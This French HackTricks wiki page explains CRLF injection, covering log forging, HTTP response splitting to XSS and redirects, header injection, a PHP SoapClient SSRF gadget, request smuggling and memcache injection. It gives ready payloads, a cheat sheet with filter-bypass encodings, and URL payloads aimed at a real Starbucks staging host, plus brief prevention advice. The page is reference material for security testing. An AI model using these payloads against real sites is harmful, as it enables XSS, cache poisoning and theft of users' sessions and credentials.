# Injection CRLF (%0D%0A)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si vous êtes intéressé par une **carrière de piratage** et que vous voulez pirater l'impossible - **nous recrutons !** (_maîtrise du polonais écrit et parlé requise_).

{% embed url="https://www.stmcyber.com/careers" %}

## Qu'est-ce que CRLF ?

Lorsqu'un navigateur envoie une requête à un serveur web, le serveur web répond avec une réponse contenant à la fois les en-têtes de réponse HTTP et le contenu réel du site web, c'est-à-dire le corps de la réponse. Les en-têtes HTTP et la réponse HTML (le contenu du site web) sont séparés par une combinaison spécifique de caractères spéciaux, à savoir un retour chariot et un saut de ligne. En abrégé, on les appelle également CRLF.

Le serveur web utilise le CRLF pour comprendre quand un nouvel en-tête HTTP commence et qu'un autre se termine. Le CRLF peut également indiquer à une application web ou à un utilisateur qu'une nouvelle ligne commence dans un fichier ou dans un bloc de texte. Les caractères CRLF sont un message standard HTTP/1.1, donc ils sont utilisés par tout type de serveur web, y compris Apache, Microsoft IIS et tous les autres.\
De [https://www.netsparker.com/blog/web-security/crlf-http-header/#](https://www.netsparker.com/blog/web-security/crlf-http-header/)

### Qu'est-ce que la vulnérabilité d'injection CRLF ?

Dans une attaque de vulnérabilité d'injection CRLF, l'attaquant insère à la fois les caractères de retour chariot et de saut de ligne dans l'entrée utilisateur pour tromper le serveur, l'application web ou l'utilisateur en pensant qu'un objet est terminé et qu'un autre a commencé. Ainsi, les séquences CRLF ne sont pas des caractères malveillants, mais elles peuvent être utilisées à des fins malveillantes, pour le fractionnement des réponses HTTP, etc.

## Injection CRLF dans les applications web

Dans les applications web, une injection CRLF peut avoir des impacts graves, selon ce que l'application fait avec des éléments individuels. Les impacts peuvent aller de la divulgation d'informations à l'exécution de code, une vulnérabilité de sécurité des applications web à impact direct. En fait, une attaque d'injection CRLF peut avoir des répercussions très graves sur une application web, même si elle n'a jamais été répertoriée dans la liste des 10 principales vulnérabilités de l'OWASP. Par exemple, il est également possible de manipuler les fichiers journaux dans un panneau d'administration, comme expliqué dans l'exemple ci-dessous.

#### Un exemple d'injection CRLF dans un fichier journal

Imaginez un fichier journal dans un panneau d'administration avec le modèle de flux de sortie suivant : IP - Heure - Chemin visité, comme ci-dessous :
```
123.123.123.123 - 08:15 - /index.php?page=home
```
Si un attaquant parvient à injecter les caractères CRLF dans la requête HTTP, il peut modifier le flux de sortie et falsifier les entrées de journal. Il peut modifier la réponse de l'application web pour quelque chose comme ci-dessous :
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Le %0d et %0a sont les formes encodées en URL de CR et LF. Par conséquent, les entrées de journal ressembleraient à ceci après que l'attaquant ait inséré ces caractères et que l'application les affiche :

IP - Heure - Chemin visité
```
123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Par conséquent, en exploitant une vulnérabilité d'injection CRLF, l'attaquant peut falsifier les entrées dans le fichier journal pour dissimuler ses propres actions malveillantes. L'attaquant fait littéralement du détournement de page et modifie la réponse. Par exemple, imaginez un scénario où l'attaquant a le mot de passe administrateur et exécute le paramètre restrictedaction, qui ne peut être utilisé que par un administrateur.

Le problème est que si l'administrateur remarque qu'une adresse IP inconnue a utilisé le paramètre restrictedaction, il se rendra compte qu'il y a un problème. Cependant, étant donné que cela ressemble maintenant à une commande émise par localhost (et donc probablement par quelqu'un qui a accès au serveur, comme un administrateur), cela ne semble pas suspect.

Toute la partie de la requête commençant par %0d%0a sera traitée par le serveur comme un seul paramètre. Ensuite, il y a un autre & avec le paramètre restrictedaction qui sera analysé par le serveur comme un autre paramètre. En effet, cela serait la même requête que :
```
/index.php?page=home&restrictedaction=edit
```
### HTTP Response Splitting

#### Description

Étant donné que l'en-tête d'une réponse HTTP et son corps sont séparés par des caractères CRLF, un attaquant peut essayer de les injecter. Une combinaison de CRLFCRLF indiquera au navigateur que l'en-tête se termine et que le corps commence. Cela signifie qu'il est maintenant capable d'écrire des données à l'intérieur du corps de la réponse où le code HTML est stocké. Cela peut entraîner une vulnérabilité de type Cross-site Scripting (XSS).

#### Un exemple de HTTP Response Splitting conduisant à une XSS

Imaginez une application qui définit un en-tête personnalisé, par exemple :
```
X-Your-Name: Bob
```
La valeur de l'en-tête est définie via un paramètre GET appelé "name". Si aucun encodage d'URL n'est en place et que la valeur est directement reflétée à l'intérieur de l'en-tête, il est possible pour un attaquant d'insérer la combinaison mentionnée ci-dessus de CRLFCRLF pour indiquer au navigateur que le corps de la requête commence. De cette manière, il est capable d'insérer des données telles qu'une charge XSS, par exemple :
```
?name=Bob%0d%0a%0d%0a<script>alert(document.domain)</script>
```
Le code ci-dessus affichera une fenêtre d'alerte dans le contexte du domaine attaqué.

#### Un exemple de HTTP Response Splitting conduisant à une redirection

{% embed url="https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62" %}

Naviguez vers :
```
/%0d%0aLocation:%20http://myweb.com
```
Et le serveur répond avec l'en-tête :
```
Location: http://myweb.com
```
**Autre exemple: (à partir de** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### Dans le chemin de l'URL

Vous pouvez envoyer la charge utile **à l'intérieur du chemin de l'URL** pour contrôler la **réponse** du serveur :
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}

### Injection d'en-tête HTTP

#### Description

En exploitant une injection CRLF, un attaquant peut également insérer des en-têtes HTTP qui pourraient être utilisés pour contourner les mécanismes de sécurité tels que le filtre XSS d'un navigateur ou la politique de même origine. Cela permet à l'attaquant d'obtenir des informations sensibles telles que des jetons CSRF. Il peut également définir des cookies qui pourraient être exploités en connectant la victime au compte de l'attaquant ou en exploitant des vulnérabilités de script intersite (XSS) autrement non exploitables.

#### Un exemple d'injection d'en-tête HTTP pour extraire des données sensibles

Si un attaquant est capable d'injecter les en-têtes HTTP qui activent CORS (partage de ressources entre origines), il peut utiliser JavaScript pour accéder à des ressources qui sont autrement protégées par SOP (Same Origin Policy), qui empêche les sites de différentes origines d'accéder les uns aux autres.

### Nouvelle requête HTTP dans SSRF

En exploitant l'injection CRLF, vous pouvez **créer une nouvelle requête HTTP et l'injecter**.\
Un bon exemple peut être réalisé en utilisant le gadget de désérialisation `SoapClient` en PHP. Cette classe est **vulnérable à CRLF** à l'intérieur du paramètre `user_agent`, ce qui permet d'**insérer de nouveaux en-têtes et du contenu de corps**. Cependant, vous pouvez même être en mesure d'exploiter cette vulnérabilité pour **injecter une nouvelle requête HTTP** :
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=>$target,
'location'=>$target,
'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

#Put a nc listening in port 9090
$client->__soapCall("test", []);
```
### Injection d'en-tête pour le trafic de requêtes

Vous pouvez injecter des en-têtes essentiels pour vous assurer que le **serveur conserve la connexion ouverte** après avoir répondu à la requête initiale :
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
Ensuite, **spécifiez une deuxième requête**. Voici une **requête d'empoisonnement classique** [**request smuggling**](http-request-smuggling/) avec des **en-têtes/corps supplémentaires** ajoutés par le serveur après l'injection.\
Voici deux des nombreuses options pour l'exploitation inter-utilisateurs.

Spécifier un **préfixe malveillant** pour empoisonner la requête du prochain utilisateur ou un cache web :

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`

Ou créer notre préfixe pour le combiner avec les données inutiles à la fin et créer une deuxième requête complète afin de déclencher **l'empoisonnement de la file d'attente de réponse**.

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

Pour plus d'informations sur cette technique et les problèmes potentiels, **consultez la source originale** (https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).

### Injection Memcache

Memcache est un **magasin clé-valeur qui utilise un protocole en texte clair**. Plus d'informations dans :

{% content-ref url="../network-services-pentesting/11211-memcache/" %}
[11211-memcache](../network-services-pentesting/11211-memcache/)
{% endcontent-ref %}

Si une plateforme **prend des données d'une requête HTTP et les utilise sans les désinfecter** pour effectuer des **requêtes** vers un serveur **memcache**, un attaquant pourrait exploiter ce comportement pour **injecter de nouvelles commandes memcache**.

Par exemple, dans la vulnérabilité découverte initialement, les clés de cache étaient utilisées pour renvoyer l'adresse IP et le port auxquels un utilisateur devait se connecter, et les attaquants étaient capables d'**injecter des commandes memcache** qui **empoisonnaient** le **cache pour envoyer les détails des victimes** (y compris les noms d'utilisateur et les mots de passe) aux serveurs de l'attaquant :

<figure><img src="../.gitbook/assets/image (6) (1) (4).png" alt=""><figcaption></figcaption></figure>

De plus, les chercheurs ont également découvert qu'ils pouvaient désynchroniser les réponses memcache pour envoyer les adresses IP et les ports des attaquants aux utilisateurs dont l'adresse e-mail était inconnue de l'attaquant :

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

**Pour obtenir toutes les informations, lisez le**[ **rapport original**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)\*\*\*\*

## Impacts de la vulnérabilité d'injection CRLF

Les impacts des injections CRLF varient et incluent également tous les impacts de la faille de script intersite (XSS) à la divulgation d'informations. Cela peut également désactiver certaines restrictions de sécurité telles que les filtres XSS et la politique de même origine dans les navigateurs de la victime, les rendant ainsi vulnérables aux attaques malveillantes.

### Comment prévenir les injections CRLF / HTTP Header dans les applications Web

La meilleure technique de prévention consiste à ne pas utiliser directement les entrées des utilisateurs dans les en-têtes de réponse. Si cela n'est pas possible, vous devez toujours utiliser une fonction pour encoder les caractères spéciaux CRLF. Une autre bonne pratique de sécurité des applications Web consiste à mettre à jour votre langage de programmation vers une version qui n'autorise pas l'injection de CR et LF dans les fonctions qui définissent les en-têtes HTTP.

### CHEAT SHEET
```
1. HTTP Response Splitting
• /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
• //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
• /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
• /google.com/%2F..%0D%0AHeader-Test:test2
• /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
• /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
• /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
• %E5%98%8A = %0A = \u560a
• %E5%98%8D = %0D = \u560d
• %E5%98%BE = %3E = \u563e (>)
• %E5%98%BC = %3C = \u563c (<)
• Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## Outil

{% embed url="https://github.com/dwisiswant0/crlfuzz" %}

## Liste de détection de force brute

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/crlf.txt" %}

## Références

* [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
* [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)

<img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si vous êtes intéressé par une **carrière de hacking** et souhaitez pirater l'impossible - **nous recrutons !** (_maîtrise du polonais écrit et parlé requise_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
